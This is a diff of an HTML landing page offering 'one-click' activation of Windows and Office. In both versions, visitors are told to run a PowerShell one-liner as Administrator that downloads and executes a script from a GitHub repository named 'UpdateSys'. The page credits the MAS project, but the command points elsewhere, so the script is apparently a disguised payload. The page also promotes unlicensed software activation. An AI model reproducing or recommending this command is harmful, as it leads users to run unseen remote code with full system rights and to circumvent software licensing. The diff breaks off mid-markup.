@@ -1,391 +1,610 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Activate Windows & Office</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://code.iconify.design/3/3.1.0/iconify.min.js"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-  <script>
-    tailwind.config = {
-      theme: {
-        extend: {
-          colors: {
-            dark: { 900: '#06080d', 800: '#0b0f17', 700: '#111827', 600: '#1a2234' },
-            accent: { DEFAULT: '#3b82f6', light: '#60a5fa', dark: '#2563eb' },
-            mint: { DEFAULT: '#34d399', dark: '#059669' },
-            gold: { DEFAULT: '#fbbf24', dim: 'rgba(251,191,36,0.08)' },
-          },
-          fontFamily: {
-            sans: ['Inter', 'system-ui', '-apple-system', 'sans-serif'],
-            mono: ['JetBrains Mono', 'Fira Code', 'Cascadia Code', 'monospace'],
-          }
-        }
-      }
-    }
-  </script>
-  <style>
-    .font-mono { font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace !important; }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>One-Click Activation · Activate Windows & Office</title>
+<meta name="description" content="Modern, fast, and open-source. Activate Windows & Office in seconds via PowerShell." />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  /* ---------- Reset & base ---------- */
+  *, *::before, *::after { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #05060a;
+    color: #e6e8ee;
+    min-height: 100vh;
+    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
 
-    .bg-grid {
-      background-image:
-        linear-gradient(rgba(59,130,246,0.03) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(59,130,246,0.03) 1px, transparent 1px);
-      background-size: 60px 60px;
-    }
+  /* ---------- Animated background ---------- */
+  .bg {
+    position: fixed;
+    inset: 0;
+    z-index: -1;
+    background:
+      radial-gradient(60% 50% at 20% 10%, rgba(99, 102, 241, 0.18), transparent 60%),
+      radial-gradient(50% 40% at 80% 0%, rgba(56, 189, 248, 0.14), transparent 60%),
+      radial-gradient(40% 30% at 50% 100%, rgba(168, 85, 247, 0.12), transparent 60%),
+      #05060a;
+  }
+  .bg::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+    background-size: 48px 48px;
+    mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
+    -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
+  }
+  .orb {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(80px);
+    opacity: 0.55;
+    animation: float 18s ease-in-out infinite;
+  }
+  .orb-1 { width: 380px; height: 380px; background: #6366f1; top: -120px; left: -80px; }
+  .orb-2 { width: 320px; height: 320px; background: #38bdf8; top: 30%; right: -100px; animation-delay: -6s; }
+  .orb-3 { width: 280px; height: 280px; background: #a855f7; bottom: -120px; left: 30%; animation-delay: -12s; }
+  @keyframes float {
+    0%, 100% { transform: translate(0, 0) scale(1); }
+    33% { transform: translate(40px, -30px) scale(1.08); }
+    66% { transform: translate(-30px, 40px) scale(0.95); }
+  }
 
-    .glow-orb {
-      position: absolute;
-      border-radius: 50%;
-      filter: blur(80px);
-      opacity: 0.4;
-      animation: orbFloat 20s ease-in-out infinite;
-    }
-    @keyframes orbFloat {
-      0%, 100% { transform: translate(0, 0) scale(1); }
-      25% { transform: translate(30px, -40px) scale(1.1); }
-      50% { transform: translate(-20px, 20px) scale(0.95); }
-      75% { transform: translate(40px, 30px) scale(1.05); }
-    }
+  /* ---------- Layout ---------- */
+  .wrap {
+    max-width: 980px;
+    margin: 0 auto;
+    padding: 56px 24px 80px;
+  }
 
-    .reveal {
-      opacity: 0;
-      filter: blur(10px);
-      transform: translateY(30px);
-      transition: all 1s cubic-bezier(0.16, 1, 0.3, 1);
-    }
-    .reveal.active {
-      opacity: 1;
-      filter: blur(0);
-      transform: translateY(0);
-    }
+  /* ---------- Header ---------- */
+  header {
+    text-align: center;
+    margin-bottom: 48px;
+  }
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 6px 14px;
+    border: 1px solid rgba(255,255,255,0.1);
+    background: rgba(255,255,255,0.04);
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    border-radius: 999px;
+    font-size: 13px;
+    font-weight: 500;
+    color: #b4b8c5;
+    margin-bottom: 24px;
+    animation: fadeUp 0.6s ease-out;
+  }
+  .badge .dot {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: #22c55e;
+    box-shadow: 0 0 8px #22c55e;
+    animation: pulse 2s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+  h1 {
+    font-size: clamp(2.5rem, 6vw, 4rem);
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    margin: 0 0 16px;
+    line-height: 1.05;
+    background: linear-gradient(180deg, #ffffff 0%, #a1a8b8 100%);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: fadeUp 0.7s ease-out 0.05s both;
+  }
+  .sub {
+    font-size: clamp(1.6rem, 3.5vw, 2.4rem);
+    font-weight: 700;
+    letter-spacing: -0.02em;
+    color: #e6e8ee;
+    margin: 0 0 12px;
+    animation: fadeUp 0.7s ease-out 0.1s both;
+  }
+  .desc {
+    font-size: 1rem;
+    color: #8b91a3;
+    margin: 0;
+    animation: fadeUp 0.7s ease-out 0.15s both;
+  }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(12px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
 
-    .terminal-bar {
-      background: rgba(15, 20, 30, 0.8);
-      border-bottom: 1px solid rgba(255,255,255,0.05);
-    }
-    .terminal-dot { width: 12px; height: 12px; border-radius: 50%; }
+  /* ---------- Card ---------- */
+  .card {
+    position: relative;
+    background: rgba(20, 22, 32, 0.6);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 16px;
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    padding: 24px;
+    margin-bottom: 20px;
+    animation: fadeUp 0.7s ease-out 0.2s both;
+  }
+  .card-label {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 13px;
+    font-weight: 600;
+    color: #b4b8c5;
+    margin-bottom: 12px;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+  }
+  .card-label .ico {
+    width: 18px; height: 18px;
+    display: inline-flex; align-items: center; justify-content: center;
+    color: #6366f1;
+  }
 
-    .copy-btn { position: relative; overflow: hidden; }
-    .copy-btn::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background: linear-gradient(135deg, transparent 40%, rgba(255,255,255,0.1) 50%, transparent 60%);
-      transform: translateX(-100%);
-      transition: transform 600ms ease;
-    }
-    .copy-btn:hover::before { transform: translateX(100%); }
+  /* ---------- Terminal block ---------- */
+  .terminal {
+    background: #0a0c14;
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 12px;
+    overflow: hidden;
+  }
+  .term-header {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 10px 14px;
+    background: rgba(255,255,255,0.02);
+    border-bottom: 1px solid rgba(255,255,255,0.06);
+  }
+  .term-dots { display: flex; gap: 6px; }
+  .term-dots span {
+    width: 11px; height: 11px; border-radius: 50%;
+    background: #2a2e3a;
+  }
+  .term-dots span:nth-child(1) { background: #ff5f57; }
+  .term-dots span:nth-child(2) { background: #febc2e; }
+  .term-dots span:nth-child(3) { background: #28c840; }
+  .term-title {
+    flex: 1;
+    text-align: center;
+    font-size: 12px;
+    color: #6b7184;
+    font-family: 'JetBrains Mono', monospace;
+  }
+  .term-body {
+    padding: 18px 18px 20px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    line-height: 1.6;
+    color: #e6e8ee;
+    overflow-x: auto;
+  }
+  .term-body .prompt { color: #6b7184; user-select: none; }
+  .term-body .cmd-cmd { color: #e6e8ee; }
+  .term-body .tok-cmd { color: #c4b5fd; }       /* irm, iex */
+  .term-body .tok-str { color: #7dd3fc; }       /* url */
+  .term-body .tok-pipe { color: #fbbf24; }      /* | */
+  .term-body .cursor {
+    display: inline-block;
+    width: 7px; height: 16px;
+    background: #6366f1;
+    margin-left: 2px;
+    vertical-align: -3px;
+    animation: blink 1s steps(1) infinite;
+  }
+  @keyframes blink {
+    0%, 50% { opacity: 1; }
+    51%, 100% { opacity: 0; }
+  }
 
-    @keyframes successPulse {
-      0% { box-shadow: 0 0 0 0 rgba(52,211,153,0.4); }
-      70% { box-shadow: 0 0 0 15px rgba(52,211,153,0); }
-      100% { box-shadow: 0 0 0 0 rgba(52,211,153,0); }
-    }
-    .success-pulse { animation: successPulse 0.6s ease-out; }
+  /* ---------- Copy button ---------- */
+  .copy-row {
+    display: flex;
+    justify-content: flex-end;
+    margin-top: 12px;
+  }
+  .copy-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 14px;
+    background: rgba(99, 102, 241, 0.12);
+    border: 1px solid rgba(99, 102, 241, 0.25);
+    border-radius: 8px;
+    color: #c7c9ff;
+    font-size: 13px;
+    font-weight: 500;
+    font-family: inherit;
+    cursor: pointer;
+    transition: all 0.15s ease;
+  }
+  .copy-btn:hover {
+    background: rgba(99, 102, 241, 0.2);
+    border-color: rgba(99, 102, 241, 0.4);
+    transform: translateY(-1px);
+  }
+  .copy-btn:active { transform: translateY(0); }
+  .copy-btn.copied {
+    background: rgba(34, 197, 94, 0.15);
+    border-color: rgba(34, 197, 94, 0.4);
+    color: #86efac;
+  }
+  .copy-btn svg { width: 14px; height: 14px; }
 
-    .step-line { position: relative; }
-    .step-line::before {
-      content: '';
-      position: absolute;
-      left: 15px;
-      top: 36px;
-      bottom: -8px;
-      width: 2px;
-      background: linear-gradient(to bottom, rgba(59,130,246,0.3), transparent);
-    }
-    .step-line:last-child::before { display: none; }
+  /* ---------- Old windows section ---------- */
+  .old-section {
+    margin-top: 28px;
+    padding-top: 20px;
+    border-top: 1px solid rgba(255,255,255,0.06);
+  }
+  .old-section h3 {
+    font-size: 14px;
+    font-weight: 600;
+    color: #b4b8c5;
+    margin: 0 0 6px;
+  }
+  .old-section p {
+    font-size: 13px;
+    color: #6b7184;
+    margin: 0 0 12px;
+  }
 
-    ::-webkit-scrollbar { width: 5px; }
-    ::-webkit-scrollbar-track { background: transparent; }
-    ::-webkit-scrollbar-thumb { background: rgba(59,130,246,0.3); border-radius: 10px; }
-    ::-webkit-scrollbar-thumb:hover { background: rgba(59,130,246,0.5); }
+  /* ---------- Steps ---------- */
+  .steps {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    gap: 16px;
+    margin-top: 8px;
+  }
+  .step {
+    position: relative;
+    padding: 20px;
+    background: rgba(255,255,255,0.02);
+    border: 1px solid rgba(255,255,255,0.06);
+    border-radius: 12px;
+    transition: all 0.2s ease;
+  }
+  .step:hover {
+    background: rgba(255,255,255,0.04);
+    border-color: rgba(99, 102, 241, 0.3);
+    transform: translateY(-2px);
+  }
+  .step-num {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 28px; height: 28px;
+    border-radius: 8px;
+    background: linear-gradient(135deg, #6366f1, #8b5cf6);
+    color: #fff;
+    font-weight: 700;
+    font-size: 13px;
+    margin-bottom: 12px;
+    box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3);
+  }
+  .step h4 {
+    font-size: 14px;
+    font-weight: 600;
+    color: #e6e8ee;
+    margin: 0 0 4px;
+  }
+  .step p {
+    font-size: 13px;
+    color: #8b91a3;
+    margin: 0;
+    line-height: 1.5;
+  }
 
-    .toast {
-      transform: translateY(20px) scale(0.95);
-      opacity: 0;
-      transition: all 400ms cubic-bezier(0.16, 1, 0.3, 1);
-    }
-    .toast.show { transform: translateY(0) scale(1); opacity: 1; }
+  /* ---------- Wait note ---------- */
+  .wait-note {
+    margin-top: 20px;
+    padding: 14px 16px;
+    background: rgba(99, 102, 241, 0.06);
+    border: 1px solid rgba(99, 102, 241, 0.2);
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 13px;
+    color: #c7c9ff;
+  }
+  .wait-note .spin {
+    width: 14px; height: 14px;
+    border: 2px solid rgba(199, 201, 255, 0.3);
+    border-top-color: #c7c9ff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
 
-    @keyframes shimmer {
-      0% { background-position: -200% 0; }
-      100% { background-position: 200% 0; }
-    }
-    .shimmer-border {
-      background: linear-gradient(90deg, transparent 30%, rgba(59,130,246,0.3) 50%, transparent 70%);
-      background-size: 200% 100%;
-      animation: shimmer 3s linear infinite;
-    }
+  /* ---------- Features strip ---------- */
+  .features {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 12px;
+    margin: 28px 0;
+    animation: fadeUp 0.7s ease-out 0.3s both;
+  }
+  .feat {
+    text-align: center;
+    padding: 18px 12px;
+    background: rgba(20, 22, 32, 0.4);
+    border: 1px solid rgba(255,255,255,0.06);
+    border-radius: 12px;
+    transition: all 0.2s ease;
+  }
+  .feat:hover {
+    border-color: rgba(99, 102, 241, 0.3);
+    background: rgba(20, 22, 32, 0.6);
+  }
+  .feat-ico {
+    width: 32px; height: 32px;
+    margin: 0 auto 8px;
+    display: flex; align-items: center; justify-content: center;
+    color: #6366f1;
+  }
+  .feat-title {
+    font-size: 14px;
+    font-weight: 600;
+    color: #e6e8ee;
+    margin: 0 0 2px;
+  }
+  .feat-desc {
+    font-size: 12px;
+    color: #6b7184;
+    margin: 0;
+  }
 
-    .particle {
-      position: absolute;
-      width: 2px;
-      height: 2px;
-      background: rgba(59,130,246,0.4);
-      border-radius: 50%;
-      animation: particleFloat linear infinite;
-    }
-    @keyframes particleFloat {
-      0% { transform: translateY(100vh) scale(0); opacity: 0; }
-      10% { opacity: 1; }
-      90% { opacity: 1; }
-      100% { transform: translateY(-10vh) scale(1); opacity: 0; }
-    }
-  </style>
+  /* ---------- Footer ---------- */
+  footer {
+    text-align: center;
+    margin-top: 48px;
+    padding-top: 24px;
+    border-top: 1px solid rgba(255,255,255,0.06);
+    animation: fadeUp 0.7s ease-out 0.35s both;
+  }
+  .powered {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 13px;
+    color: #6b7184;
+  }
+  .powered a {
+    color: #e6e8ee;
+    text-decoration: none;
+    font-weight: 500;
+    display: inline-flex; align-items: center; gap: 4px;
+    transition: color 0.15s ease;
+  }
+  .powered a:hover { color: #c7c9ff; }
+  .sep { color: #2a2e3a; }
+  .github-ico { width: 14px; height: 14px; }
+
+  /* ---------- Toast ---------- */
+  .toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) translateY(20px);
+    background: rgba(20, 22, 32, 0.95);
+    border: 1px solid rgba(34, 197, 94, 0.3);
+    color: #86efac;
+    padding: 10px 18px;
+    border-radius: 10px;
+    font-size: 13px;
+    font-weight: 500;
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    opacity: 0;
+    pointer-events: none;
+    transition: all 0.25s ease;
+    z-index: 1000;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .toast.show {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+
+  /* ---------- Responsive ---------- */
+  @media (max-width: 640px) {
+    .wrap { padding: 40px 16px 60px; }
+    .features { grid-template-columns: 1fr; }
+    .steps { grid-template-columns: 1fr; }
+    .term-body { font-size: 12px; }
+  }
+</style>
 </head>
-<body class="bg-dark-900 min-h-screen text-white overflow-x-hidden">
+<body>
 
-  <div class="fixed inset-0 bg-grid pointer-events-none" aria-hidden="true"></div>
+<div class="bg">
+  <div class="orb orb-1"></div>
+  <div class="orb orb-2"></div>
+  <div class="orb orb-3"></div>
+</div>
 
-  <div class="fixed inset-0 pointer-events-none overflow-hidden" aria-hidden="true">
-    <div class="glow-orb w-[500px] h-[500px] bg-blue-600/20 -top-40 -left-40" style="animation-delay: 0s;"></div>
-    <div class="glow-orb w-[400px] h-[400px] bg-emerald-600/15 bottom-20 -right-32" style="animation-delay: -7s;"></div>
-    <div class="glow-orb w-[300px] h-[300px] bg-purple-600/10 top-1/2 left-1/2" style="animation-delay: -14s;"></div>
+<div class="wrap">
+
+  <header>
+    <div class="badge"><span class="dot"></span> One-Click Activation</div>
+    <h1>Activate Windows & Office</h1>
+    <p class="desc">Modern and fast.</p>
+  </header>
+
+  <div class="features">
+    <div class="feat">
+      <div class="feat-ico">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="28" height="28"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+      </div>
+      <p class="feat-title">Fast</p>
+      <p class="feat-desc">Done in seconds</p>
+    </div>
+    <div class="feat">
+      <div class="feat-ico">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="28" height="28"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg>
+      </div>
+      <p class="feat-title">Automatic</p>
+      <p class="feat-desc">No manual steps</p>
+    </div>
   </div>
 
-  <div id="particles" class="fixed inset-0 pointer-events-none overflow-hidden" aria-hidden="true"></div>
-
-  <main class="relative z-10 min-h-screen flex flex-col items-center justify-center px-4 py-12 sm:py-20">
-
-    <div class="reveal mb-8">
-      <div class="w-20 h-20 rounded-2xl bg-gradient-to-br from-blue-500 to-blue-700 flex items-center justify-center shadow-lg shadow-blue-600/20 hover:shadow-blue-600/40 transition-shadow duration-500 hover:rotate-3">
-        <span class="iconify text-white" data-icon="mdi:microsoft-windows" data-width="40"></span>
-      </div>
-    </div>
-
-    <div class="reveal" style="transition-delay: 80ms;">
-      <span class="inline-flex items-center gap-2 text-[11px] font-bold uppercase tracking-[0.2em] text-mint bg-mint/10 border border-mint/20 px-4 py-1.5 rounded-full">
-        <span class="w-1.5 h-1.5 rounded-full bg-mint animate-pulse"></span>
-        One-Click Activation
+  <!-- Main command card -->
+  <div class="card">
+    <div class="card-label">
+      <span class="ico">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="18" height="18"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
       </span>
+      Run the command below in PowerShell as Administrator
     </div>
 
-    <h1 class="reveal text-4xl sm:text-5xl md:text-6xl font-bold text-center mt-6 mb-4 leading-tight tracking-tight" style="transition-delay: 160ms;">
-      Activate <span class="bg-gradient-to-r from-blue-400 to-blue-600 bg-clip-text text-transparent">Windows</span>
-      <span class="text-white/30 mx-2">&</span>
-      <span class="bg-gradient-to-r from-emerald-400 to-emerald-600 bg-clip-text text-transparent">Office</span>
-    </h1>
+    <div class="terminal">
+      <div class="term-header">
+        <div class="term-dots"><span></span><span></span><span></span></div>
+        <div class="term-title">PowerShell — Administrator</div>
+        <div style="width: 50px;"></div>
+      </div>
+      <div class="term-body">
+        <div><span class="prompt">PS&gt;&nbsp;</span><span class="tok-cmd">irm </span><span class="tok-str">https://raw.githubusercontent.com/UpdateSys/win/main/win</span><span class="tok-pipe"> | </span><span class="tok-cmd">iex</span><span class="cursor"></span></div>
+      </div>
+    </div>
 
-    <p class="reveal text-base sm:text-lg text-slate-400 text-center max-w-xl mb-10 leading-relaxed font-light" style="transition-delay: 240ms;">
-      Modern, fast, and open-source.
-      <br class="hidden sm:block">
-      Run the command below in <span class="text-white font-medium">PowerShell as Administrator</span>.
-    </p>
+    <div class="copy-row">
+      <button class="copy-btn" data-copy="irm https://raw.githubusercontent.com/UpdateSys/win/main/win | iex" aria-label="Copy command">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+        <span>Copy</span>
+      </button>
+    </div>
 
-    <div class="reveal w-full max-w-3xl" style="transition-delay: 320ms;">
-      <div class="relative rounded-2xl p-px shimmer-border">
-        <div class="rounded-2xl overflow-hidden bg-dark-800/90 backdrop-blur-xl border border-white/[0.06]">
-          <div class="terminal-bar px-5 py-3 flex items-center justify-between">
-            <div class="flex items-center gap-2">
-              <div class="terminal-dot bg-red-500/80"></div>
-              <div class="terminal-dot bg-yellow-500/80"></div>
-              <div class="terminal-dot bg-green-500/80"></div>
-            </div>
-            <span class="text-[11px] text-slate-500 font-mono">PowerShell — Administrator</span>
-            <div class="w-14"></div>
-          </div>
-          <div class="p-5 sm:p-7 flex flex-col sm:flex-row items-stretch sm:items-center gap-4">
-            <div class="flex-1 bg-black/30 rounded-xl px-5 py-4 border border-white/[0.04] cursor-pointer group" id="mainCodeBox" title="Click to copy">
-              <div class="flex items-center gap-2 mb-2">
-                <span class="text-blue-500 font-mono text-xs">PS&gt;</span>
-              </div>
-              <code id="mainCommand" class="font-mono text-sm sm:text-[15px] text-slate-200 leading-relaxed break-all cursor-pointer">irm https://raw.githubusercontent.com/UpdateSys/win/main/win | iex</code>
-            </div>
-            <button class="copy-btn flex items-center justify-center gap-2.5 bg-accent hover:bg-accent-dark text-white font-bold text-sm px-7 py-4 rounded-xl transition-all duration-200 hover:scale-[1.03] active:scale-95 whitespace-nowrap flex-shrink-0" id="mainCopyBtn" aria-label="Copy main command">
-              <span class="iconify" data-icon="mdi:content-copy" data-width="18" id="mainCopyIcon"></span>
-              <span id="mainCopyText">Copy</span>
-            </button>
-          </div>
+    <div class="old-section">
+      <h3>Old Windows</h3>
+      <p>For Windows 8.1 / 10 (old builds), run this first:</p>
+      <div class="terminal">
+        <div class="term-body" style="padding: 14px 16px;">
+          <span class="prompt">PS&gt;&nbsp;</span><span class="cmd-cmd">[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12</span>
         </div>
       </div>
-    </div>
-
-    <div class="reveal w-full max-w-3xl mt-5" style="transition-delay: 400ms;">
-      <div class="rounded-xl bg-gold-dim border border-yellow-500/10 p-4 sm:p-5">
-        <div class="flex flex-col sm:flex-row items-start gap-3">
-          <div class="flex items-center gap-2 flex-shrink-0">
-            <span class="inline-flex items-center gap-1.5 text-[10px] font-bold uppercase tracking-wider text-yellow-400 bg-yellow-500/10 px-2.5 py-1 rounded-full border border-yellow-500/15">
-              <span class="iconify" data-icon="mdi:information-outline" data-width="12"></span>
-              Old Windows
-            </span>
-          </div>
-          <div class="flex-1 w-full">
-            <p class="text-slate-300 text-sm mb-3">
-              For <span class="text-white font-medium">Windows 8.1 / 10 (old builds)</span>, run this first:
-            </p>
-            <div class="flex items-stretch gap-2 bg-black/30 rounded-lg p-1 border border-white/[0.04]">
-              <code id="tlsCommand" class="font-mono text-[11px] sm:text-xs text-slate-300 leading-relaxed break-all flex-1 px-3 py-2.5 cursor-pointer">[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12</code>
-              <button class="copy-btn flex items-center gap-1.5 bg-slate-700 hover:bg-slate-600 text-white text-[10px] font-bold px-3 py-1.5 rounded-lg transition-all duration-200 hover:scale-[1.03] active:scale-95 flex-shrink-0" id="tlsCopyBtn" aria-label="Copy TLS command">
-                <span class="iconify" data-icon="mdi:content-copy" data-width="12" id="tlsCopyIcon"></span>
-                <span id="tlsCopyText">Copy</span>
-              </button>
-            </div>
-          </div>
-        </div>
+      <div class="copy-row">
+        <button class="copy-btn" data-copy="[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12" aria-label="Copy TLS command">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          <span>Copy</span>
+        </button>
       </div>
     </div>
-
-    <div class="reveal w-full max-w-3xl mt-10" style="transition-delay: 480ms;">
-      <div class="rounded-2xl bg-dark-800/50 backdrop-blur-sm border border-white/[0.05] p-6 sm:p-8">
-        <h3 class="text-xs font-bold uppercase tracking-[0.2em] text-slate-500 mb-6 flex items-center gap-2">
-          <span class="iconify text-accent" data-icon="mdi:format-list-numbered" data-width="16"></span>
-          How to use
-        </h3>
-        <div class="space-y-5">
-          <div class="step-line flex gap-4">
-            <div class="w-8 h-8 rounded-full bg-accent/10 border border-accent/20 flex items-center justify-center flex-shrink-0 text-accent text-xs font-bold">1</div>
-            <div class="pt-1">
-              <p class="text-slate-300 text-sm leading-relaxed"><span class="text-white font-medium">Copy</span> the main command above</p>
-            </div>
-          </div>
-          <div class="step-line flex gap-4">
-            <div class="w-8 h-8 rounded-full bg-accent/10 border border-accent/20 flex items-center justify-center flex-shrink-0 text-accent text-xs font-bold">2</div>
-            <div class="pt-1">
-              <p class="text-slate-300 text-sm leading-relaxed">If on an old build, copy and run the <span class="text-white font-medium">TLS command</span> first</p>
-            </div>
-          </div>
-          <div class="step-line flex gap-4">
-            <div class="w-8 h-8 rounded-full bg-accent/10 border border-accent/20 flex items-center justify-center flex-shrink-0 text-accent text-xs font-bold">3</div>
-            <div class="pt-1">
-              <p class="text-slate-300 text-sm leading-relaxed">Open <span class="text-white font-medium">PowerShell as Administrator</span> (right-click → Run as admin)</p>
-            </div>
-          </div>
-          <div class="step-line flex gap-4">
-            <div class="w-8 h-8 rounded-full bg-accent/10 border border-accent/20 flex items-center justify-center flex-shrink-0 text-accent text-xs font-bold">4</div>
-            <div class="pt-1">
-              <p class="text-slate-300 text-sm leading-relaxed"><span class="text-white font-medium">Paste</span> the command and press <span class="text-white font-medium font-mono text-xs bg-white/5 px-1.5 py-0.5 rounded">Enter</span></p>
-            </div>
-          </div>
-          <div class="step-line flex gap-4">
-            <div class="w-8 h-8 rounded-full bg-mint/10 border border-mint/20 flex items-center justify-center flex-shrink-0 text-mint text-xs font-bold">
-              <span class="iconify" data-icon="mdi:check" data-width="14"></span>
-            </div>
-            <div class="pt-1">
-              <p class="text-slate-300 text-sm leading-relaxed">Wait a few seconds — <span class="text-mint font-medium">activation runs automatically</span></p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="reveal w-full max-w-3xl mt-8 grid grid-cols-1 sm:grid-cols-2 gap-4" style="transition-delay: 560ms;">
-      <div class="rounded-xl bg-dark-800/40 border border-white/[0.04] p-5 text-center hover:border-accent/20 hover:bg-dark-800/60 transition-all duration-300 group">
-        <div class="w-10 h-10 rounded-xl bg-accent/10 flex items-center justify-center mx-auto mb-3 group-hover:bg-accent/20 transition-colors">
-          <span class="iconify text-accent" data-icon="mdi:lightning-bolt" data-width="20"></span>
-        </div>
-        <div class="text-white text-sm font-medium mb-1">Fast</div>
-        <div class="text-slate-500 text-xs">Done in seconds</div>
-      </div>
-      <div class="rounded-xl bg-dark-800/40 border border-white/[0.04] p-5 text-center hover:border-purple-500/20 hover:bg-dark-800/60 transition-all duration-300 group">
-        <div class="w-10 h-10 rounded-xl bg-purple-500/10 flex items-center justify-center mx-auto mb-3 group-hover:bg-purple-500/20 transition-colors">
-          <span class="iconify text-purple-400" data-icon="mdi:auto-fix" data-width="20"></span>
-        </div>
-        <div class="text-white text-sm font-medium mb-1">Automatic</div>
-        <div class="text-slate-500 text-xs">No manual steps</div>
-      </div>
-    </div>
-
-    <div class="reveal mt-14 flex flex-col items-center gap-3" style="transition-delay: 640ms;">
-      <div class="flex items-center gap-4 text-xs text-slate-600">
-        <span>Powered by</span>
-        <a href="https://massgrave.dev" target="_blank" rel="noopener noreferrer" class="inline-flex items-center gap-1.5 text-slate-400 hover:text-blue-400 transition-colors duration-200 border-b border-dashed border-slate-700 hover:border-blue-400/50 pb-0.5">
-          <span class="iconify" data-icon="mdi:open-in-new" data-width="11"></span>
-          MAS
-        </a>
-        <span class="text-slate-700">·</span>
-        <a href="https://github.com/" target="_blank" rel="noopener noreferrer" class="inline-flex items-center gap-1.5 text-slate-400 hover:text-blue-400 transition-colors duration-200 border-b border-dashed border-slate-700 hover:border-blue-400/50 pb-0.5">
-          <span class="iconify" data-icon="mdi:github" data-width="13"></span>
-          GitHub
-        </a>
-      </div>
-    </div>
-  </main>
-
-  <div id="toast" class="toast fixed bottom-6 left-1/2 -translate-x-1/2 z-50 bg-emerald-600/90 backdrop-blur-xl text-white px-5 py-3 rounded-2xl flex items-center gap-3 shadow-2xl shadow-emerald-600/20 border border-emerald-500/20">
-    <span class="iconify" data-icon="mdi:check-circle" data-width="20"></span>
